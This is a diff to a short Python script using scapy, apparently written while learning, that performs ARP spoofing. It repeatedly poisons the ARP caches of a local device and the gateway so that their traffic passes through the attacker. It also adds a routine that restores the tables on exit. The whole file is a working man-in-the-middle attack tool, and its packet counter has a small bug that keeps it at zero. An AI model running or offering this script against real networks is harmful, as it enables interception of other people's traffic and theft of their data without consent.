@@ -1,5 +1,7 @@
 import scapy.all as scapy 
 import time
+import sys
+mmac = '11:22:33:44:ff:ff'
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -9,20 +11,38 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast,
                               timeout=1, verbose=False)[0]
     #print(answered.summary())
-    router = answered_list[0][1].hwsrc
-    return router
+    return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     #spoof ip is the ip that we pretend to be, (router_ip)
+    #NOTE: hwsrc is nor in ARP function. Scapy automatically detect my mac
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
-#spoof target_ip who_am_i_ip
-while True:
-    #tell target to i am router
-    spoof("192.168.2.173", "192.168.2.1")
-    #tell router to i am the target
-    spoof("192.168.2.1", "192.168.2.173")
-    time.sleep(2)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    #this time unlike spoof function we should set hwsrc
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.2.173" #IPAD
+gateway_ip = "192.168.2.1"
+try:
+    packets_sent_count = 0
+    while True:
+        #tell target to i am router
+        spoof(target_ip, gateway_ip)
+        #tell router to i am the target
+        spoof(gateway_ip, target_ip)
+        packets_sent_count += packets_sent_count
+        print(f"\n [+] Sent {packets_sent_count}")
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nQuitting...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
